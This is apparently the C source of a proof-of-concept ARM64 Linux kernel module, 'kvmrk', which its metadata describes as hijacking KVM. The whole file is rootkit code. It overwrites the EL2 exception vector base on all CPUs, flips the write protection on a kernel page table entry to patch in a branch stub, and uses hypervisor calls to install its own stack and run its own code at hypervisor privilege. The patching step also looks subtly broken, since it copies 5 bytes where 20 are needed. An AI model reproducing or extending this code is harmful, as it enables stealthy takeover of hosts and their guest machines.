#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/smp.h>
#include <asm/kvm_host.h>
#include <asm/kvm_hyp.h>
#include <asm/memory.h>

#include <asm/syscall.h>    // syscall_fn_t, __NR_*
#include <asm/ptrace.h>     // struct pt_regs
#include <asm/tlbflush.h>   // flush_tlb_kernel_range()
#include <asm/pgtable.h>    // {clear,set}_pte_bit(), set_pte()
#include <linux/vmalloc.h>  // vm_unmap_aliases()
#include <linux/mm.h>       // struct mm_struct, apply_to_page_range()
#include <linux/kconfig.h>  // IS_ENABLED()

#include "include/kvmrk.h"
#include "include/resolve_kallsyms.h"
#include "include/assembler.h"
#include "include/set_page_flags.h"
#include "include/helpers.h"

DEFINE_PER_CPU(struct kvm_host_data, kvmrk_host_data);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("wintermute");
MODULE_DESCRIPTION("hijacking kvm on arm");
MODULE_VERSION("0.01");


__attribute__((optimize("align-functions=4096"))) void kvmrk_handle_trap(struct kvm_cpu_context *host_ctxt) {
    u64 esr = read_sysreg_el2(SYS_ESR);

    switch (ESR_ELx_EC(esr)) {
    	case ESR_ELx_EC_CP14_MR: {
            asm volatile("mov     x0, 0x33\n\t");
            break;
        }
	}
}

static int __init kvmrk_init(void) {
    printk(KERN_INFO "kvmrk: module loaded\n");

    init_init_mm_ptr();

    int i;

    printk(KERN_INFO "kvmrk: kvmrk_vectors @ %lx\n", kvmrk_vectors);
    printk(KERN_INFO "kvmrk: highmem_virt_to_phys(kvmrk_vectors) @ %lx\n", highmem_virt_to_phys(kvmrk_vectors));

    printk(KERN_INFO "kvmrk: dumping kvmrk_vectors\n");
    for (i = 0x400; i < 0x408; i += 4) {
        printk(KERN_INFO "      %02x %02x %02x %02x",
            ((char *) kvmrk_vectors)[i],
            ((char *) kvmrk_vectors)[i + 1],
            ((char *) kvmrk_vectors)[i + 2],
            ((char *) kvmrk_vectors)[i + 3]);
    }

    for (i = 0; i < num_online_cpus(); i++) {
        kvmrk_sched_setaffinity(0, get_cpu_mask(i));
        kvmrk_init_host_cpu_context(&this_cpu_ptr(&kvmrk_host_data)->host_ctxt);
    }
    printk(KERN_INFO "kvmrk: init cpu context on all cpus\n");

    // use on_each_cpu here, + to initialize mpidr
    for (i = 0; i < num_online_cpus(); i++) {
        kvmrk_sched_setaffinity(0, get_cpu_mask(i));
        kvmrk_reset_vectors();
    }
    printk(KERN_INFO "kvmrk: reset vectors on all cpus to _hyp_stub_vectors\n");

    for (i = 0; i < num_online_cpus(); i++) {
        kvmrk_sched_setaffinity(0, get_cpu_mask(i));
        kvmrk_set_vectors(highmem_virt_to_phys(kvmrk_vectors));
    }
    printk(KERN_INFO "kvmrk: set vectors on all cpus to kvmrk_vectors, pa @ %lx\n", highmem_virt_to_phys(kvmrk_vectors));
    printk(KERN_INFO "kvmrk: replaced vbar_el2 on all cpus\n");

    printk(KERN_INFO "kvmrk: kvmrk_hijack_mdcr_el2 @ %lx\n", hijack_mdcr_el2);
    printk(KERN_INFO "kvmrk: highmem_virt_to_phys(kvmrk_hijack_mdcr_el2) @ %lx\n", highmem_virt_to_phys(hijack_mdcr_el2));

    void *kvmrk_hyp_stack = kmalloc(KVMRK_HYP_STACK_SIZE, GFP_KERNEL);

    // WHY
    uint32_t to_copy[5];
    assemble_absolute_load(0b10011, highmem_virt_to_phys(kvmrk_handle_trap), to_copy);
    to_copy[4] = cpu_to_le32(0xd61f0260);

    pte_flip_write_protect(virt_to_pte(copy_here_start));
    flush_cache_mm(init_mm_ptr);
    flush_tlb_all();
    kvmrk_flush_virt(virt_to_pte(copy_here_start));
    memcpy(copy_here_start, to_copy, 5);

    flush_cache_mm(init_mm_ptr);
    flush_tlb_all();
    kvmrk_flush_virt(kvmrk_vectors);
    kvmrk_flush_virt(hijack_mdcr_el2);
    kvmrk_flush_virt(kvmrk_hyp_stack);
    kvmrk_flush_virt(kvmrk_handle_trap);

    kvmrk_hvc(KVMRK_SET_SP, virt_to_phys(kvmrk_hyp_stack), NULL, NULL);
    register unsigned long r asm("x0");
    printk(KERN_INFO "kvmrk: KVMRK_SET_SP returned %lx\n", r);

    kvmrk_hvc(KVMRK_CALL_HYP, highmem_virt_to_phys(hijack_mdcr_el2), NULL, NULL);
    register unsigned long r2 asm("x0");
    printk(KERN_INFO "kvmrk: KVMRK_CALL_HYP returned %lx\n", r2);

    // asm volatile("mrs x0, dbgbcr0_el1");
    // register unsigned long r3 asm("x0");
    // printk(KERN_INFO "kvmrk: read dbgbcr_0 returned %lx\n", r3);

    return 0;
}

static void __exit kvmrk_exit(void) {
    printk(KERN_INFO "kvmrk: module unloaded\n");
}

module_init(kvmrk_init);
module_exit(kvmrk_exit);
